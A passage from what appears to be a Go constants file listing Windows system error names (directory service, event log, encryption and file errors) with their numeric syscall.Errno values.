ERROR_DS_DUP_MSDS_INTID                                                   syscall.Errno = 8597
ERROR_DS_DUP_OID                                                          syscall.Errno = 8379
ERROR_DS_DUP_RDN                                                          syscall.Errno = 8378
ERROR_DS_DUP_SCHEMA_ID_GUID                                               syscall.Errno = 8381
ERROR_DS_ENCODING_ERROR                                                   syscall.Errno = 8252
ERROR_DS_EPOCH_MISMATCH                                                   syscall.Errno = 8483
ERROR_DS_EXISTING_AD_CHILD_NC                                             syscall.Errno = 8613
ERROR_DS_EXISTS_IN_AUX_CLS                                                syscall.Errno = 8393
ERROR_DS_EXISTS_IN_MAY_HAVE                                               syscall.Errno = 8386
ERROR_DS_EXISTS_IN_MUST_HAVE                                              syscall.Errno = 8385
ERROR_DS_EXISTS_IN_POSS_SUP                                               syscall.Errno = 8395
ERROR_DS_EXISTS_IN_RDNATTID                                               syscall.Errno = 8598
ERROR_DS_EXISTS_IN_SUB_CLS                                                syscall.Errno = 8394
ERROR_DS_FILTER_UNKNOWN                                                   syscall.Errno = 8254
ERROR_DS_FILTER_USES_CONTRUCTED_ATTRS                                     syscall.Errno = 8555
ERROR_DS_FLAT_NAME_EXISTS_IN_FOREST                                       syscall.Errno = 8635
ERROR_DS_FOREST_VERSION_TOO_HIGH                                          syscall.Errno = 8563
ERROR_DS_FOREST_VERSION_TOO_LOW                                           syscall.Errno = 8565
ERROR_DS_GCVERIFY_ERROR                                                   syscall.Errno = 8417
ERROR_DS_GC_NOT_AVAILABLE                                                 syscall.Errno = 8217
ERROR_DS_GC_REQUIRED                                                      syscall.Errno = 8547
ERROR_DS_GENERIC_ERROR                                                    syscall.Errno = 8341
ERROR_DS_GLOBAL_CANT_HAVE_CROSSDOMAIN_MEMBER                              syscall.Errno = 8519
ERROR_DS_GLOBAL_CANT_HAVE_LOCAL_MEMBER                                    syscall.Errno = 8516
ERROR_DS_GLOBAL_CANT_HAVE_UNIVERSAL_MEMBER                                syscall.Errno = 8517
ERROR_DS_GOVERNSID_MISSING                                                syscall.Errno = 8410
ERROR_DS_GROUP_CONVERSION_ERROR                                           syscall.Errno = 8607
ERROR_DS_HAVE_PRIMARY_MEMBERS                                             syscall.Errno = 8521
ERROR_DS_HIERARCHY_TABLE_MALLOC_FAILED                                    syscall.Errno = 8429
ERROR_DS_HIERARCHY_TABLE_TOO_DEEP                                         syscall.Errno = 8628
ERROR_DS_HIGH_ADLDS_FFL                                                   syscall.Errno = 8641
ERROR_DS_HIGH_DSA_VERSION                                                 syscall.Errno = 8642
ERROR_DS_ILLEGAL_BASE_SCHEMA_MOD                                          syscall.Errno = 8507
ERROR_DS_ILLEGAL_MOD_OPERATION                                            syscall.Errno = 8311
ERROR_DS_ILLEGAL_SUPERIOR                                                 syscall.Errno = 8345
ERROR_DS_ILLEGAL_XDOM_MOVE_OPERATION                                      syscall.Errno = 8492
ERROR_DS_INAPPROPRIATE_AUTH                                               syscall.Errno = 8233
ERROR_DS_INAPPROPRIATE_MATCHING                                           syscall.Errno = 8238
ERROR_DS_INCOMPATIBLE_CONTROLS_USED                                       syscall.Errno = 8574
ERROR_DS_INCOMPATIBLE_VERSION                                             syscall.Errno = 8567
ERROR_DS_INCORRECT_ROLE_OWNER                                             syscall.Errno = 8210
ERROR_DS_INIT_FAILURE                                                     syscall.Errno = 8532
ERROR_DS_INIT_FAILURE_CONSOLE                                             syscall.Errno = 8561
ERROR_DS_INSTALL_NO_SCH_VERSION_IN_INIFILE                                syscall.Errno = 8512
ERROR_DS_INSTALL_NO_SRC_SCH_VERSION                                       syscall.Errno = 8511
ERROR_DS_INSTALL_SCHEMA_MISMATCH                                          syscall.Errno = 8467
ERROR_DS_INSUFFICIENT_ATTR_TO_CREATE_OBJECT                               syscall.Errno = 8606
ERROR_DS_INSUFF_ACCESS_RIGHTS                                             syscall.Errno = 8344
ERROR_DS_INTERNAL_FAILURE                                                 syscall.Errno = 8430
ERROR_DS_INVALID_ATTRIBUTE_SYNTAX                                         syscall.Errno = 8203
ERROR_DS_INVALID_DMD                                                      syscall.Errno = 8360
ERROR_DS_INVALID_DN_SYNTAX                                                syscall.Errno = 8242
ERROR_DS_INVALID_GROUP_TYPE                                               syscall.Errno = 8513
ERROR_DS_INVALID_LDAP_DISPLAY_NAME                                        syscall.Errno = 8479
ERROR_DS_INVALID_NAME_FOR_SPN                                             syscall.Errno = 8554
ERROR_DS_INVALID_ROLE_OWNER                                               syscall.Errno = 8366
ERROR_DS_INVALID_SCRIPT                                                   syscall.Errno = 8600
ERROR_DS_INVALID_SEARCH_FLAG                                              syscall.Errno = 8500
ERROR_DS_INVALID_SEARCH_FLAG_SUBTREE                                      syscall.Errno = 8626
ERROR_DS_INVALID_SEARCH_FLAG_TUPLE                                        syscall.Errno = 8627
ERROR_DS_IS_LEAF                                                          syscall.Errno = 8243
ERROR_DS_KEY_NOT_UNIQUE                                                   syscall.Errno = 8527
ERROR_DS_LDAP_SEND_QUEUE_FULL                                             syscall.Errno = 8616
ERROR_DS_LINK_ID_NOT_AVAILABLE                                            syscall.Errno = 8577
ERROR_DS_LOCAL_CANT_HAVE_CROSSDOMAIN_LOCAL_MEMBER                         syscall.Errno = 8520
ERROR_DS_LOCAL_ERROR                                                      syscall.Errno = 8251
ERROR_DS_LOCAL_MEMBER_OF_LOCAL_ONLY                                       syscall.Errno = 8548
ERROR_DS_LOOP_DETECT                                                      syscall.Errno = 8246
ERROR_DS_LOW_ADLDS_FFL                                                    syscall.Errno = 8643
ERROR_DS_LOW_DSA_VERSION                                                  syscall.Errno = 8568
ERROR_DS_MACHINE_ACCOUNT_CREATED_PRENT4                                   syscall.Errno = 8572
ERROR_DS_MACHINE_ACCOUNT_QUOTA_EXCEEDED                                   syscall.Errno = 8557
ERROR_DS_MAPI_ID_NOT_AVAILABLE                                            syscall.Errno = 8632
ERROR_DS_MASTERDSA_REQUIRED                                               syscall.Errno = 8314
ERROR_DS_MAX_OBJ_SIZE_EXCEEDED                                            syscall.Errno = 8304
ERROR_DS_MEMBERSHIP_EVALUATED_LOCALLY                                     syscall.Errno = 8201
ERROR_DS_MISSING_EXPECTED_ATT                                             syscall.Errno = 8411
ERROR_DS_MISSING_FOREST_TRUST                                             syscall.Errno = 8649
ERROR_DS_MISSING_FSMO_SETTINGS                                            syscall.Errno = 8434
ERROR_DS_MISSING_INFRASTRUCTURE_CONTAINER                                 syscall.Errno = 8497
ERROR_DS_MISSING_REQUIRED_ATT                                             syscall.Errno = 8316
ERROR_DS_MISSING_SUPREF                                                   syscall.Errno = 8406
ERROR_DS_MODIFYDN_DISALLOWED_BY_FLAG                                      syscall.Errno = 8581
ERROR_DS_MODIFYDN_DISALLOWED_BY_INSTANCE_TYPE                             syscall.Errno = 8579
ERROR_DS_MODIFYDN_WRONG_GRANDPARENT                                       syscall.Errno = 8582
ERROR_DS_MUST_BE_RUN_ON_DST_DC                                            syscall.Errno = 8558
ERROR_DS_NAME_ERROR_DOMAIN_ONLY                                           syscall.Errno = 8473
ERROR_DS_NAME_ERROR_NOT_FOUND                                             syscall.Errno = 8470
ERROR_DS_NAME_ERROR_NOT_UNIQUE                                            syscall.Errno = 8471
ERROR_DS_NAME_ERROR_NO_MAPPING                                            syscall.Errno = 8472
ERROR_DS_NAME_ERROR_NO_SYNTACTICAL_MAPPING                                syscall.Errno = 8474
ERROR_DS_NAME_ERROR_RESOLVING                                             syscall.Errno = 8469
ERROR_DS_NAME_ERROR_TRUST_REFERRAL                                        syscall.Errno = 8583
ERROR_DS_NAME_NOT_UNIQUE                                                  syscall.Errno = 8571
ERROR_DS_NAME_REFERENCE_INVALID                                           syscall.Errno = 8373
ERROR_DS_NAME_TOO_LONG                                                    syscall.Errno = 8348
ERROR_DS_NAME_TOO_MANY_PARTS                                              syscall.Errno = 8347
ERROR_DS_NAME_TYPE_UNKNOWN                                                syscall.Errno = 8351
ERROR_DS_NAME_UNPARSEABLE                                                 syscall.Errno = 8350
ERROR_DS_NAME_VALUE_TOO_LONG                                              syscall.Errno = 8349
ERROR_DS_NAMING_MASTER_GC                                                 syscall.Errno = 8523
ERROR_DS_NAMING_VIOLATION                                                 syscall.Errno = 8247
ERROR_DS_NCNAME_MISSING_CR_REF                                            syscall.Errno = 8412
ERROR_DS_NCNAME_MUST_BE_NC                                                syscall.Errno = 8357
ERROR_DS_NC_MUST_HAVE_NC_PARENT                                           syscall.Errno = 8494
ERROR_DS_NC_STILL_HAS_DSAS                                                syscall.Errno = 8546
ERROR_DS_NONEXISTENT_MAY_HAVE                                             syscall.Errno = 8387
ERROR_DS_NONEXISTENT_MUST_HAVE                                            syscall.Errno = 8388
ERROR_DS_NONEXISTENT_POSS_SUP                                             syscall.Errno = 8390
ERROR_DS_NONSAFE_SCHEMA_CHANGE                                            syscall.Errno = 8508
ERROR_DS_NON_ASQ_SEARCH                                                   syscall.Errno = 8624
ERROR_DS_NON_BASE_SEARCH                                                  syscall.Errno = 8480
ERROR_DS_NOTIFY_FILTER_TOO_COMPLEX                                        syscall.Errno = 8377
ERROR_DS_NOT_AN_OBJECT                                                    syscall.Errno = 8352
ERROR_DS_NOT_AUTHORITIVE_FOR_DST_NC                                       syscall.Errno = 8487
ERROR_DS_NOT_CLOSEST                                                      syscall.Errno = 8588
ERROR_DS_NOT_INSTALLED                                                    syscall.Errno = 8200
ERROR_DS_NOT_ON_BACKLINK                                                  syscall.Errno = 8362
ERROR_DS_NOT_SUPPORTED                                                    syscall.Errno = 8256
ERROR_DS_NOT_SUPPORTED_SORT_ORDER                                         syscall.Errno = 8570
ERROR_DS_NO_ATTRIBUTE_OR_VALUE                                            syscall.Errno = 8202
ERROR_DS_NO_BEHAVIOR_VERSION_IN_MIXEDDOMAIN                               syscall.Errno = 8569
ERROR_DS_NO_CHAINED_EVAL                                                  syscall.Errno = 8328
ERROR_DS_NO_CHAINING                                                      syscall.Errno = 8327
ERROR_DS_NO_CHECKPOINT_WITH_PDC                                           syscall.Errno = 8551
ERROR_DS_NO_CROSSREF_FOR_NC                                               syscall.Errno = 8363
ERROR_DS_NO_DELETED_NAME                                                  syscall.Errno = 8355
ERROR_DS_NO_FPO_IN_UNIVERSAL_GROUPS                                       syscall.Errno = 8549
ERROR_DS_NO_MORE_RIDS                                                     syscall.Errno = 8209
ERROR_DS_NO_MSDS_INTID                                                    syscall.Errno = 8596
ERROR_DS_NO_NEST_GLOBALGROUP_IN_MIXEDDOMAIN                               syscall.Errno = 8514
ERROR_DS_NO_NEST_LOCALGROUP_IN_MIXEDDOMAIN                                syscall.Errno = 8515
ERROR_DS_NO_NTDSA_OBJECT                                                  syscall.Errno = 8623
ERROR_DS_NO_OBJECT_MOVE_IN_SCHEMA_NC                                      syscall.Errno = 8580
ERROR_DS_NO_PARENT_OBJECT                                                 syscall.Errno = 8329
ERROR_DS_NO_PKT_PRIVACY_ON_CONNECTION                                     syscall.Errno = 8533
ERROR_DS_NO_RDN_DEFINED_IN_SCHEMA                                         syscall.Errno = 8306
ERROR_DS_NO_REF_DOMAIN                                                    syscall.Errno = 8575
ERROR_DS_NO_REQUESTED_ATTS_FOUND                                          syscall.Errno = 8308
ERROR_DS_NO_RESULTS_RETURNED                                              syscall.Errno = 8257
ERROR_DS_NO_RIDS_ALLOCATED                                                syscall.Errno = 8208
ERROR_DS_NO_SERVER_OBJECT                                                 syscall.Errno = 8622
ERROR_DS_NO_SUCH_OBJECT                                                   syscall.Errno = 8240
ERROR_DS_NO_TREE_DELETE_ABOVE_NC                                          syscall.Errno = 8501
ERROR_DS_NTDSCRIPT_PROCESS_ERROR                                          syscall.Errno = 8592
ERROR_DS_NTDSCRIPT_SYNTAX_ERROR                                           syscall.Errno = 8591
ERROR_DS_OBJECT_BEING_REMOVED                                             syscall.Errno = 8339
ERROR_DS_OBJECT_CLASS_REQUIRED                                            syscall.Errno = 8315
ERROR_DS_OBJECT_RESULTS_TOO_LARGE                                         syscall.Errno = 8248
ERROR_DS_OBJ_CLASS_NOT_DEFINED                                            syscall.Errno = 8371
ERROR_DS_OBJ_CLASS_NOT_SUBCLASS                                           syscall.Errno = 8372
ERROR_DS_OBJ_CLASS_VIOLATION                                              syscall.Errno = 8212
ERROR_DS_OBJ_GUID_EXISTS                                                  syscall.Errno = 8361
ERROR_DS_OBJ_NOT_FOUND                                                    syscall.Errno = 8333
ERROR_DS_OBJ_STRING_NAME_EXISTS                                           syscall.Errno = 8305
ERROR_DS_OBJ_TOO_LARGE                                                    syscall.Errno = 8312
ERROR_DS_OFFSET_RANGE_ERROR                                               syscall.Errno = 8262
ERROR_DS_OID_MAPPED_GROUP_CANT_HAVE_MEMBERS                               syscall.Errno = 8637
ERROR_DS_OID_NOT_FOUND                                                    syscall.Errno = 8638
ERROR_DS_OPERATIONS_ERROR                                                 syscall.Errno = 8224
ERROR_DS_OUT_OF_SCOPE                                                     syscall.Errno = 8338
ERROR_DS_OUT_OF_VERSION_STORE                                             syscall.Errno = 8573
ERROR_DS_PARAM_ERROR                                                      syscall.Errno = 8255
ERROR_DS_PARENT_IS_AN_ALIAS                                               syscall.Errno = 8330
ERROR_DS_PDC_OPERATION_IN_PROGRESS                                        syscall.Errno = 8490
ERROR_DS_POLICY_NOT_KNOWN                                                 syscall.Errno = 8618
ERROR_DS_PROTOCOL_ERROR                                                   syscall.Errno = 8225
ERROR_DS_RANGE_CONSTRAINT                                                 syscall.Errno = 8322
ERROR_DS_RDN_DOESNT_MATCH_SCHEMA                                          syscall.Errno = 8307
ERROR_DS_RECALCSCHEMA_FAILED                                              syscall.Errno = 8396
ERROR_DS_REFERRAL                                                         syscall.Errno = 8235
ERROR_DS_REFERRAL_LIMIT_EXCEEDED                                          syscall.Errno = 8260
ERROR_DS_REFUSING_FSMO_ROLES                                              syscall.Errno = 8433
ERROR_DS_REMOTE_CROSSREF_OP_FAILED                                        syscall.Errno = 8601
ERROR_DS_REPLICATOR_ONLY                                                  syscall.Errno = 8370
ERROR_DS_REPLICA_SET_CHANGE_NOT_ALLOWED_ON_DISABLED_CR                    syscall.Errno = 8595
ERROR_DS_REPL_LIFETIME_EXCEEDED                                           syscall.Errno = 8614
ERROR_DS_RESERVED_LINK_ID                                                 syscall.Errno = 8576
ERROR_DS_RESERVED_MAPI_ID                                                 syscall.Errno = 8631
ERROR_DS_RIDMGR_DISABLED                                                  syscall.Errno = 8263
ERROR_DS_RIDMGR_INIT_ERROR                                                syscall.Errno = 8211
ERROR_DS_ROLE_NOT_VERIFIED                                                syscall.Errno = 8610
ERROR_DS_ROOT_CANT_BE_SUBREF                                              syscall.Errno = 8326
ERROR_DS_ROOT_MUST_BE_NC                                                  syscall.Errno = 8301
ERROR_DS_ROOT_REQUIRES_CLASS_TOP                                          syscall.Errno = 8432
ERROR_DS_SAM_INIT_FAILURE                                                 syscall.Errno = 8504
ERROR_DS_SAM_INIT_FAILURE_CONSOLE                                         syscall.Errno = 8562
ERROR_DS_SAM_NEED_BOOTKEY_FLOPPY                                          syscall.Errno = 8530
ERROR_DS_SAM_NEED_BOOTKEY_PASSWORD                                        syscall.Errno = 8529
ERROR_DS_SCHEMA_ALLOC_FAILED                                              syscall.Errno = 8415
ERROR_DS_SCHEMA_NOT_LOADED                                                syscall.Errno = 8414
ERROR_DS_SCHEMA_UPDATE_DISALLOWED                                         syscall.Errno = 8509
ERROR_DS_SECURITY_CHECKING_ERROR                                          syscall.Errno = 8413
ERROR_DS_SECURITY_ILLEGAL_MODIFY                                          syscall.Errno = 8423
ERROR_DS_SEC_DESC_INVALID                                                 syscall.Errno = 8354
ERROR_DS_SEC_DESC_TOO_SHORT                                               syscall.Errno = 8353
ERROR_DS_SEMANTIC_ATT_TEST                                                syscall.Errno = 8383
ERROR_DS_SENSITIVE_GROUP_VIOLATION                                        syscall.Errno = 8505
ERROR_DS_SERVER_DOWN                                                      syscall.Errno = 8250
ERROR_DS_SHUTTING_DOWN                                                    syscall.Errno = 8364
ERROR_DS_SINGLE_USER_MODE_FAILED                                          syscall.Errno = 8590
ERROR_DS_SINGLE_VALUE_CONSTRAINT                                          syscall.Errno = 8321
ERROR_DS_SIZELIMIT_EXCEEDED                                               syscall.Errno = 8227
ERROR_DS_SORT_CONTROL_MISSING                                             syscall.Errno = 8261
ERROR_DS_SOURCE_AUDITING_NOT_ENABLED                                      syscall.Errno = 8552
ERROR_DS_SOURCE_DOMAIN_IN_FOREST                                          syscall.Errno = 8534
ERROR_DS_SPN_VALUE_NOT_UNIQUE_IN_FOREST                                   syscall.Errno = 8647
ERROR_DS_SRC_AND_DST_NC_IDENTICAL                                         syscall.Errno = 8485
ERROR_DS_SRC_AND_DST_OBJECT_CLASS_MISMATCH                                syscall.Errno = 8540
ERROR_DS_SRC_DC_MUST_BE_SP4_OR_GREATER                                    syscall.Errno = 8559
ERROR_DS_SRC_GUID_MISMATCH                                                syscall.Errno = 8488
ERROR_DS_SRC_NAME_MISMATCH                                                syscall.Errno = 8484
ERROR_DS_SRC_OBJ_NOT_GROUP_OR_USER                                        syscall.Errno = 8538
ERROR_DS_SRC_SID_EXISTS_IN_FOREST                                         syscall.Errno = 8539
ERROR_DS_STRING_SD_CONVERSION_FAILED                                      syscall.Errno = 8522
ERROR_DS_STRONG_AUTH_REQUIRED                                             syscall.Errno = 8232
ERROR_DS_SUBREF_MUST_HAVE_PARENT                                          syscall.Errno = 8356
ERROR_DS_SUBTREE_NOTIFY_NOT_NC_HEAD                                       syscall.Errno = 8376
ERROR_DS_SUB_CLS_TEST_FAIL                                                syscall.Errno = 8391
ERROR_DS_SYNTAX_MISMATCH                                                  syscall.Errno = 8384
ERROR_DS_THREAD_LIMIT_EXCEEDED                                            syscall.Errno = 8587
ERROR_DS_TIMELIMIT_EXCEEDED                                               syscall.Errno = 8226
ERROR_DS_TREE_DELETE_NOT_FINISHED                                         syscall.Errno = 8397
ERROR_DS_UNABLE_TO_SURRENDER_ROLES                                        syscall.Errno = 8435
ERROR_DS_UNAVAILABLE                                                      syscall.Errno = 8207
ERROR_DS_UNAVAILABLE_CRIT_EXTENSION                                       syscall.Errno = 8236
ERROR_DS_UNDELETE_SAM_VALIDATION_FAILED                                   syscall.Errno = 8645
ERROR_DS_UNICODEPWD_NOT_IN_QUOTES                                         syscall.Errno = 8556
ERROR_DS_UNIVERSAL_CANT_HAVE_LOCAL_MEMBER                                 syscall.Errno = 8518
ERROR_DS_UNKNOWN_ERROR                                                    syscall.Errno = 8431
ERROR_DS_UNKNOWN_OPERATION                                                syscall.Errno = 8365
ERROR_DS_UNWILLING_TO_PERFORM                                             syscall.Errno = 8245
ERROR_DS_UPN_VALUE_NOT_UNIQUE_IN_FOREST                                   syscall.Errno = 8648
ERROR_DS_USER_BUFFER_TO_SMALL                                             syscall.Errno = 8309
ERROR_DS_VALUE_KEY_NOT_UNIQUE                                             syscall.Errno = 8650
ERROR_DS_VERSION_CHECK_FAILURE                                            syscall.Errno = 643
ERROR_DS_WKO_CONTAINER_CANNOT_BE_SPECIAL                                  syscall.Errno = 8611
ERROR_DS_WRONG_LINKED_ATT_SYNTAX                                          syscall.Errno = 8528
ERROR_DS_WRONG_OM_OBJ_CLASS                                               syscall.Errno = 8476
ERROR_DUPLICATE_FOUND                        Errno = 0x20000000 
ERROR_DUPLICATE_PRIVILEGES                                                syscall.Errno = 311
ERROR_DUPLICATE_SERVICE_NAME                                              syscall.Errno = 1078
ERROR_DUPLICATE_TAG                                                       syscall.Errno = 2014
ERROR_DUP_DOMAINNAME                                                      syscall.Errno = 1221
ERROR_DUP_NAME                                                            syscall.Errno = 52
ERROR_DYNAMIC_CODE_BLOCKED                                                syscall.Errno = 1655
ERROR_DYNLINK_FROM_INVALID_RING                                           syscall.Errno = 196
ERROR_EAS_DIDNT_FIT                                                       syscall.Errno = 275
ERROR_EAS_NOT_SUPPORTED                                                   syscall.Errno = 282
ERROR_EA_ACCESS_DENIED                                                    syscall.Errno = 994
ERROR_EA_FILE_CORRUPT                                                     syscall.Errno = 276
ERROR_EA_LIST_INCONSISTENT                                                syscall.Errno = 255
ERROR_EA_TABLE_FULL                                                       syscall.Errno = 277
ERROR_EC_CIRCULAR_FORWARDING                                              syscall.Errno = 15082
ERROR_EC_CREDSTORE_FULL                                                   syscall.Errno = 15083
ERROR_EC_CRED_NOT_FOUND                                                   syscall.Errno = 15084
ERROR_EC_LOG_DISABLED                                                     syscall.Errno = 15081
ERROR_EC_NO_ACTIVE_CHANNEL                                                syscall.Errno = 15085
ERROR_EC_SUBSCRIPTION_CANNOT_ACTIVATE                                     syscall.Errno = 15080
ERROR_EDP_DPL_POLICY_CANT_BE_SATISFIED                                    syscall.Errno = 357
ERROR_EDP_POLICY_DENIES_OPERATION                                         syscall.Errno = 356
ERROR_EFS_ALG_BLOB_TOO_BIG                                                syscall.Errno = 6013
ERROR_EFS_DISABLED                                                        syscall.Errno = 6015
ERROR_EFS_NOT_ALLOWED_IN_TRANSACTION                                      syscall.Errno = 6831
ERROR_EFS_SERVER_NOT_TRUSTED                                              syscall.Errno = 6011
ERROR_EFS_VERSION_NOT_SUPPORT                                             syscall.Errno = 6016
ERROR_ELEVATION_REQUIRED                                                  syscall.Errno = 740
ERROR_EMPTY                                                               syscall.Errno = 4306
ERROR_ENCLAVE_FAILURE                                                     syscall.Errno = 349
ERROR_ENCLAVE_NOT_TERMINATED                                              syscall.Errno = 814
ERROR_ENCLAVE_VIOLATION                                                   syscall.Errno = 815
ERROR_ENCRYPTED_IO_NOT_POSSIBLE                                           syscall.Errno = 808
ERROR_ENCRYPTING_METADATA_DISALLOWED                                      syscall.Errno = 431
ERROR_ENCRYPTION_DISABLED                                                 syscall.Errno = 430
ERROR_ENCRYPTION_FAILED                                                   syscall.Errno = 6000
ERROR_ENCRYPTION_POLICY_DENIES_OPERATION                                  syscall.Errno = 6022
ERROR_END_OF_MEDIA                                                        syscall.Errno = 1100
ERROR_ENLISTMENT_NOT_FOUND                                                syscall.Errno = 6717
ERROR_ENLISTMENT_NOT_SUPERIOR                                             syscall.Errno = 6820
ERROR_ENVVAR_NOT_FOUND                                                    syscall.Errno = 203
ERROR_EOM_OVERFLOW                                                        syscall.Errno = 1129
ERROR_ERRORS_ENCOUNTERED                                                  syscall.Errno = 774
ERROR_EVALUATION_EXPIRATION                                               syscall.Errno = 622
ERROR_EVENTLOG_CANT_START                                                 syscall.Errno = 1501
ERROR_EVENTLOG_FILE_CHANGED                                               syscall.Errno = 1503
ERROR_EVENTLOG_FILE_CORRUPT                                               syscall.Errno = 1500
ERROR_EVENT_DONE                                                          syscall.Errno = 710
ERROR_EVENT_PENDING                                                       syscall.Errno = 711
ERROR_EVT_CANNOT_OPEN_CHANNEL_OF_QUERY                                    syscall.Errno = 15036
ERROR_EVT_CHANNEL_CANNOT_ACTIVATE                                         syscall.Errno = 15025
ERROR_EVT_CHANNEL_NOT_FOUND                                               syscall.Errno = 15007
ERROR_EVT_CONFIGURATION_ERROR                                             syscall.Errno = 15010
ERROR_EVT_EVENT_DEFINITION_NOT_FOUND                                      syscall.Errno = 15032
ERROR_EVT_EVENT_TEMPLATE_NOT_FOUND                                        syscall.Errno = 15003
ERROR_EVT_FILTER_ALREADYSCOPED                                            syscall.Errno = 15014
ERROR_EVT_FILTER_INVARG                                                   syscall.Errno = 15016
ERROR_EVT_FILTER_INVTEST                                                  syscall.Errno = 15017
ERROR_EVT_FILTER_INVTYPE                                                  syscall.Errno = 15018
ERROR_EVT_FILTER_NOTELTSET                                                syscall.Errno = 15015
ERROR_EVT_FILTER_OUT_OF_RANGE                                             syscall.Errno = 15038
ERROR_EVT_FILTER_PARSEERR                                                 syscall.Errno = 15019
ERROR_EVT_FILTER_TOO_COMPLEX                                              syscall.Errno = 15026
ERROR_EVT_FILTER_UNEXPECTEDTOKEN                                          syscall.Errno = 15021
ERROR_EVT_FILTER_UNSUPPORTEDOP                                            syscall.Errno = 15020
ERROR_EVT_INVALID_CHANNEL_PATH                                            syscall.Errno = 15000
ERROR_EVT_INVALID_CHANNEL_PROPERTY_VALUE                                  syscall.Errno = 15023
ERROR_EVT_INVALID_EVENT_DATA                                              syscall.Errno = 15005
ERROR_EVT_INVALID_OPERATION_OVER_ENABLED_DIRECT_CHANNEL                   syscall.Errno = 15022
ERROR_EVT_INVALID_PUBLISHER_NAME                                          syscall.Errno = 15004
ERROR_EVT_INVALID_PUBLISHER_PROPERTY_VALUE                                syscall.Errno = 15024
ERROR_EVT_INVALID_QUERY                                                   syscall.Errno = 15001
ERROR_EVT_MALFORMED_XML_TEXT                                              syscall.Errno = 15008
ERROR_EVT_MAX_INSERTS_REACHED                                             syscall.Errno = 15031
ERROR_EVT_MESSAGE_ID_NOT_FOUND                                            syscall.Errno = 15028
ERROR_EVT_MESSAGE_LOCALE_NOT_FOUND                                        syscall.Errno = 15033
ERROR_EVT_MESSAGE_NOT_FOUND                                               syscall.Errno = 15027
ERROR_EVT_NON_VALIDATING_MSXML                                            syscall.Errno = 15013
ERROR_EVT_PUBLISHER_DISABLED                                              syscall.Errno = 15037
ERROR_EVT_PUBLISHER_METADATA_NOT_FOUND                                    syscall.Errno = 15002
ERROR_EVT_QUERY_RESULT_INVALID_POSITION                                   syscall.Errno = 15012
ERROR_EVT_QUERY_RESULT_STALE                                              syscall.Errno = 15011
ERROR_EVT_SUBSCRIPTION_TO_DIRECT_CHANNEL                                  syscall.Errno = 15009
ERROR_EVT_UNRESOLVED_PARAMETER_INSERT                                     syscall.Errno = 15030
ERROR_EVT_UNRESOLVED_VALUE_INSERT                                         syscall.Errno = 15029
ERROR_EVT_VERSION_TOO_NEW                                                 syscall.Errno = 15035
ERROR_EVT_VERSION_TOO_OLD                                                 syscall.Errno = 15034
ERROR_EXCEPTION_IN_RESOURCE_CALL                                          syscall.Errno = 5930
ERROR_EXCEPTION_IN_SERVICE                                                syscall.Errno = 1064
ERROR_EXCL_SEM_ALREADY_OWNED                                              syscall.Errno = 101
ERROR_EXE_CANNOT_MODIFY_SIGNED_BINARY                                     syscall.Errno = 217
ERROR_EXE_CANNOT_MODIFY_STRONG_SIGNED_BINARY                              syscall.Errno = 218
ERROR_EXE_MACHINE_TYPE_MISMATCH                                           syscall.Errno = 216
ERROR_EXE_MARKED_INVALID                                                  syscall.Errno = 192
ERROR_EXPECTED_SECTION_NAME                  Errno = 0x20000000 
ERROR_EXPIRED_HANDLE                                                      syscall.Errno = 6854
ERROR_EXTENDED_ERROR                                                      syscall.Errno = 1208
ERROR_EXTERNAL_BACKING_PROVIDER_UNKNOWN                                   syscall.Errno = 343
ERROR_EXTERNAL_SYSKEY_NOT_SUPPORTED                                       syscall.Errno = 399
ERROR_EXTRANEOUS_INFORMATION                                              syscall.Errno = 677
ERROR_FAILED_DRIVER_ENTRY                                                 syscall.Errno = 647
ERROR_FAILED_SERVICE_CONTROLLER_CONNECT                                   syscall.Errno = 1063
ERROR_FAIL_FAST_EXCEPTION                                                 syscall.Errno = 1653
ERROR_FAIL_I24                                                            syscall.Errno = 83
ERROR_FAIL_NOACTION_REBOOT                                                syscall.Errno = 350
ERROR_FAIL_REBOOT_INITIATED                                               syscall.Errno = 3018
ERROR_FAIL_REBOOT_REQUIRED                                                syscall.Errno = 3017
ERROR_FAIL_RESTART                                                        syscall.Errno = 352
ERROR_FAIL_SHUTDOWN                                                       syscall.Errno = 351
ERROR_FATAL_APP_EXIT                                                      syscall.Errno = 713
ERROR_FILEMARK_DETECTED                                                   syscall.Errno = 1101
ERROR_FILENAME_EXCED_RANGE                                                syscall.Errno = 206
ERROR_FILEQUEUE_LOCKED                       Errno = 0x20000000 
ERROR_FILE_CHECKED_OUT                                                    syscall.Errno = 220
ERROR_FILE_CORRUPT                                                        syscall.Errno = 1392
ERROR_FILE_ENCRYPTED                                                      syscall.Errno = 6002
ERROR_FILE_EXISTS                                                         syscall.Errno = 80
ERROR_FILE_HANDLE_REVOKED                                                 syscall.Errno = 806
ERROR_FILE_HASH_NOT_IN_CATALOG               Errno = 0x20000000 
ERROR_FILE_IDENTITY_NOT_PERSISTENT                                        syscall.Errno = 6823
ERROR_FILE_INVALID                                                        syscall.Errno = 1006
ERROR_FILE_LEVEL_TRIM_NOT_SUPPORTED                                       syscall.Errno = 326
ERROR_FILE_METADATA_OPTIMIZATION_IN_PROGRESS                              syscall.Errno = 809
ERROR_FILE_NOT_ENCRYPTED                                                  syscall.Errno = 6007
ERROR_FILE_NOT_FOUND                                                      syscall.Errno = 2
ERROR_FILE_NOT_SUPPORTED                                                  syscall.Errno = 425
ERROR_FILE_OFFLINE                                                        syscall.Errno = 4350
ERROR_FILE_PROTECTED_UNDER_DPL                                            syscall.Errno = 406
ERROR_FILE_READ_ONLY                                                      syscall.Errno = 6009
ERROR_FILE_SHARE_RESOURCE_CONFLICT                                        syscall.Errno = 5938
ERROR_FILE_SYSTEM_LIMITATION                                              syscall.Errno = 665
ERROR_FILE_SYSTEM_VIRTUALIZATION_BUSY                                     syscall.Errno = 371
ERROR_FILE_SYSTEM_VIRTUALIZATION_INVALID_OPERATION                        syscall.Errno = 385
ERROR_FILE_SYSTEM_VIRTUALIZATION_METADATA_CORRUPT                         syscall.Errno = 370
ERROR_FILE_SYSTEM_VIRTUALIZATION_PROVIDER_UNKNOWN                         syscall.Errno = 372
ERROR_FILE_SYSTEM_VIRTUALIZATION_UNAVAILABLE                              syscall.Errno = 369
ERROR_FILE_TOO_LARGE                                                      syscall.Errno = 223
ERROR_FIRMWARE_UPDATED                                                    syscall.Errno = 728
ERROR_FLOATED_SECTION                                                     syscall.Errno = 6846
ERROR_FLOAT_MULTIPLE_FAULTS                                               syscall.Errno = 630
ERROR_FLOAT_MULTIPLE_TRAPS                                                syscall.Errno = 631
ERROR_FLOPPY_BAD_REGISTERS                                                syscall.Errno = 1125
